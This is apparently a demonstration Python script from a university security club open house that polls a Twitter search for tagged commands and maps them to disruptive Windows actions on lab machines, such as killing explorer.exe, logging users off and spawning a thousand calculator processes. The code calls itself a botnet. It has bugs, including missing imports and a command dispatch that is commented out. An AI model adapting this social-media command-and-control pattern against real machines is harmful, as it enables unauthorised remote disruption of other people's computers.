#!/usr/bin/env python
''' Author: Jared E Stroud
    Purpose: RIT CSEC Open House Twitter C2 (Fall 2015)
    Email: lol, just go to Bo.
'''

import requests
import re
import time

class WindowsCmds():
    '''
        Executing Windows commands.
    '''
    def __init__(self):
        import os
        import subprocess

    def killFirefox(self):
        os.system('taskkill /f /im exampleProcess.exe')

    def killExplorer(self):
        os.system('taskkill /f /im explorer.exe')

    def logOff(self):
        os.system('shutdown /l')

    def magnify(self):
        os.system('magnify.exe')

    def calcMe(self):
        x = 0
        while x < 1000:
            subprocess.Popen(['calc.exe'])
            x += 1



class TweetScrape():
    '''
        No Twitter libraries just requests (standard in Python 3.2+ (I think))
        and handy dandy regexes.
    '''

    def __init__(self):
        '''
            Initialization of the class.

        '''
        self.hello_world = "Running application..."
        print(self.hello_world) # Debugging


    def get_Tweets(self,url):
        '''
            Parameters: 
                Url: Twitter page to scrape.

        '''
        r = requests.get(url)
        if r.status_code == 200:
            return r.text.encode('utf8') # Ensure no weird unicode stuff happens.
        else:
            print("Something broke...")# Content doesn't exist :/ 
            sys.exit()

    def obtain_commands(self,content):
        '''
            Parameters: 
                    Content: Regex through content from get_Tweets
                        to obtain commands.

            Return: Twitter commands.
        '''
        cmd = re.search(r"(CSEC)\.\w+\.\w+", content) # Hash tagto use followed by a space the command another space and the target machine.
        if cmd == None:
            print(content) # Debugging
        else:
            return cmd.group(0) #, cmd.group(1) # group(0) for everything

    def windows_cmdExcution(command, machine):
        '''
            Parameters: 
                    Command: Botnet function to execute.
                    Machine: Lab machine to attack.
            Return: Nothing
        '''
        winexe = WindowsCmds

        if command == "midtermMadness": 
            winexe.killFirefox()

        elif command  == "golisanoSmash":
            winexe.killExplorer()

        elif command  == "daryl":
            winexe.magnify()

        elif command  == "deli":
            winexe.logOff()

        elif command  == "yuanSpawn":
            winexe.calcMe()


    def split_tweet(self, dottedTweet):
        '''
            Parameters: 
                dottedTweet: CSEC.Open.House would be an input obtained by obtain_commands 
                This function split that tweet into three separate words.

                The results of this function will be passed into windows_cmdExecution to complete a command.
        '''

        machine = dottedTweet.split(".")[1]
        action = dottedTweet.split(".")[2]
        print("Action: " + str(action) + " applied to machine " + str(machine))

        #windows_cmdExection(action, machine)


if __name__ == "__main__":

    # Object declaration
    twitter = TweetScrape()

    while 1: 

        twitter_content = twitter.get_Tweets("https://twitter.com/search?f=tweets&vertical=default&q=%40RITCSEC&src=typd") # Twitter scraping
        command_tweet = twitter.obtain_commands(twitter_content)
        twitter.split_tweet(command_tweet)
        time.sleep(25)
